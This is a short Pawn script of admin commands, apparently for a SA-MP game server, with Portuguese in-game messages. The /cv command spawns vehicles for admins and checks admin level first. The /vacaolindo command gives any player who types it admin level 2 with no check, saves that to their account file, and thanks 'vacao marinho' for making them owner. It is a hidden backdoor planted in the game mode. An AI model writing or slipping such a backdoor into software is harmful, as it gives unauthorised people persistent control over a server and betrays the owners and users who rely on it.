// Comandos admin

CMD:vacaolindo(playerid)
{
	PlayerInfo[playerid][pAdmin] = 2;
	DOF2_SetInt(Conta, "Admin", PlayerInfo[playerid][pAdmin]);
	DOF2_SaveFile();
	SendInfo(playerid, "Voce virou dono graças ao vacao marinho");
	return 1;
}

CMD:cv(playerid,params[])
{
	if(PlayerInfo[playerid][pAdmin] < 1) return 0;
	new Float:x, Float:y, Float:z, Float:rot, vID, modelo;
	new engine,lights,alarm,doors,bonnet,boot,objective;
	if(isempty(params))
	{
		SendErro(playerid, "Digite: /cv [modelo]");
		return 1;
	}
	if(IsPlayerConnected(playerid))
	{
		if(!isNumeric(params))
		{
			if(IsPlayerInAnyVehicle(playerid))
			{
				SendErro(playerid, "Saia deste veículo para criar outro.");
				return 1;
			}
			GetPlayerFacingAngle(playerid, rot);
			GetPlayerPos(playerid, x, y, z);
			vID = CreateVehicle(ReturnVehicleID(params),  x, y, z, rot, random(126), random(126), 600);
			PutPlayerInVehicle(playerid, vID, 0);
			GetVehicleParamsEx(vID, engine, lights, alarm, doors, bonnet, boot, objective);
			SetVehicleParamsEx(vID, 1, 1, alarm, doors, bonnet, boot, objective);
			SendInfo(playerid, "Veículo criado!");
		}
		else
		{
			GetPlayerFacingAngle(playerid, rot);
			GetPlayerPos(playerid, x, y, z);
			if(sscanf(params, "i", modelo)) return SendErro(playerid, "Modelo invalido");
			vID = CreateVehicle(modelo, x, y, z, rot, random(126), random(126), 600);
			PutPlayerInVehicle(playerid, vID, 0);
			GetVehicleParamsEx(vID, engine, lights, alarm, doors, bonnet, boot, objective);
			SetVehicleParamsEx(vID, 1, 1, alarm, doors, bonnet, boot, objective);
			SendInfo(playerid, "Veículo criado!");
		}
	}
	return 1;
}